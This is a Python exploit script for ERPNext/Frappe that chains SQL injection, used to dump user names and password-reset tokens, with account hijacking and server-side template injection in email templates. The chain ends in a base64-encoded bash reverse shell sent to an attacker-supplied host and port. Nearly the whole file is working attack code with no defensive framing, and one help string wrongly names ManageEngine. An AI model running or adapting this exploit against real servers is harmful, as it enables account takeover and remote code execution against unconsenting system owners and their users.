#!/usr/env/python3

import argparse
import requests
import base64
import uuid
import json

def sqliRequest(url,query):
    
    postData = {
        "cmd" : "frappe.utils.global_search.web_search",
        "text" : "twopoint",
        "scope" : f"\" {query} -- -"
    }
    res = requests.post(url,data=postData)

    return res

def getAccounts(url):

    print("[~] Retrieving user accounts...")

    res = sqliRequest(url,"UNION ALL SELECT 1,2,3,4,name COLLATE utf8mb4_general_ci from __Auth")
    userJson = json.loads(res.text)
    users = []
    for name in userJson['message']:
        users.append(name['route'])

    return users

def resetPassword(url,password,accounts=None):

    if accounts == None:
        print("[-] No accounts retrieved :(")
        exit()

    c = None
    while c not in range(1,len(accounts)+1):
        print("[?] Hijack which account?")
        for name in accounts:
            print(f"> {accounts.index(name)+1} : {name}")
        c = int(input(">>> "))

    victim = accounts[c-1]
    print(f"[!] Hijacking {victim}")
    print(f"[~] Sending password reset...")

    pwdData = {
        "cmd" : "frappe.core.doctype.user.user.reset_password",
        "user" : f"{victim}"
    }
    res = requests.post(url,data=pwdData)

    print(f"[~] Retrieving reset token...")

    res = sqliRequest(url,f"UNION ALL SELECT 1,2,3,4,reset_password_key COLLATE utf8mb4_general_ci from tabUser where email = '{victim}'")
    tokenJson = json.loads(res.text)
    token = tokenJson['message'][0]['route']

    print(f"[~] Resetting password to {password}...")

    resetData = {
        "key" : f"{token}",
        "old_password" : "",
        "new_password" : f"{password}",
        "logout_all_sessions" : 1,
        "cmd" : "frappe.core.doctype.user.user.update_password"
    }
    res = requests.post(url,resetData)

    print(f"[+] Password reset!")

    return victim

def sstiShell(url, lhost, lport, victim, password):

    print("[~] Logging with hijacked account...")

    sesh = requests.Session()
    loginData = {
        "cmd" : "login",
        "usr" : f"{victim}",
        "pwd" : f"{password}",
        "device" : "desktop"
    }
    sesh.post(url,data=loginData)

    templateName = uuid.uuid4()
    print(f"[~] Creating bad email template with name {templateName}...")

    createUrl = url + "/api/method/frappe.desk.form.save.savedocs"

    sstiData = {
        "doc" : f'{{"docstatus":0,"doctype":"Email Template","name":"New Email Template 1","__islocal":1,"__unsaved":1,"owner":"{victim}","__newname":"{templateName}","subject":"{templateName}","response":"<div>{{{{ (\\"twopoint\\" | attr(\\"__class__\\") | attr(\\"__mro__\\"))[-1] | attr(\\"__subclasses__\\")() }}}}</div>"}}',
        "action" : "Save"
    }
    res = sesh.post(createUrl, data=sstiData)

    
    print("[~] Finding RCE class route...")

    triggerUrl = url + "/api/method/frappe.email.doctype.email_template.email_template.get_email_template"

    trigger = f'{{"modified":"2024-03-12 00:28:32.527172","subject":"{templateName}","modified_by":"{victim}","creation":"2024-03-12 00:28:32.527172","idx":0,"name":"{templateName}","owner":"{victim}","doctype":"Email Template","response":"<div>{{{{ (\\"twopoint\\" | attr(\\"__class__\\") | attr(\\"__mro__\\"))[-1] | attr(\\"__subclasses__\\")() }}}}</div>","docstatus":0,"__last_sync_on":"2024-03-12T15:01:24.803Z"}}'
    triggerData = {
        "template_name" : f"{templateName}",
        "doc" : trigger,
        "_lang" : ""
    }
    res = sesh.post(triggerUrl, data=triggerData)

    classesJson = json.loads(res.text)
    classes = classesJson['message']['message']
    classes = classes.split(",")
    shellClassId = classes.index(" <class 'subprocess.Popen'>")

    print(f"[~] Opening shell with subprocess.Popen subclass with id {shellClassId}...")

    shellTemplateName = uuid.uuid4()

    cmd = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    encoded = cmd.encode("utf-8")
    encoded = base64.b64encode(encoded)
    encoded = encoded.decode("utf-8")

    shellTemplateData = {
        "doc" : f'{{"docstatus":0,"doctype":"Email Template","name":"New Email Template 1","__islocal":1,"__unsaved":1,"owner":"{victim}","__newname":"{shellTemplateName}","subject":"{shellTemplateName}","response":"<div>{{{{ ((\\"twopoint\\" | attr(\\"__class__\\") | attr(\\"__mro__\\"))[-1] | attr(\\"__subclasses__\\")())[{shellClassId-1}](\'echo {encoded} | base64 -d | bash \',shell=True,stdout=-1).communicate()[0].strip() }}}}</div>"}}',
        "action" : "Save"
    }
    res = sesh.post(createUrl, data=shellTemplateData)

    shellTrigger = f'{{"modified":"2024-03-12 00:28:32.527172","subject":"{shellTemplateName}","modified_by":"{victim}","creation":"2024-03-12 00:28:32.527172","idx":0,"name":"{shellTemplateName}","owner":"{victim}","doctype":"Email Template","response":"<div>{{{{ ((\\"twopoint\\" | attr(\\"__class__\\") | attr(\\"__mro__\\"))[-1] | attr(\\"__subclasses__\\")())[{shellClassId-1}](\'echo {encoded} | base64 -d | bash \',shell=True,stdout=-1).communicate()[0].strip() }}}}</div>","docstatus":0,"__last_sync_on":"2024-03-12T15:01:24.803Z"}}'
    shellData = {
        "template_name" : f"{shellTemplateName}",
        "doc" : shellTrigger,
        "_lang" : ""
    }
    res = sesh.post(triggerUrl, data=shellData)

    print("[+] Shell triggered!")

    return

def main():
    
    print("// ERPNext Auth Bypass to SSTI RCE")

    # Parser
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="Base URL of ManageEngine server", type=str)
    parser.add_argument("lhost", help="Local IP for listener", type=str)
    parser.add_argument("lport", help="Local port for listener", type=str)
    parser.add_argument("password", nargs="?", default="Twopoint123!", help="Password to reset account to.", type=str)
    args = parser.parse_args()

    accounts = getAccounts(args.url)
    victim = resetPassword(args.url,args.password,accounts)

    sstiShell(args.url,args.lhost,args.lport, victim, args.password)

    return

if __name__ == '__main__':
    main()
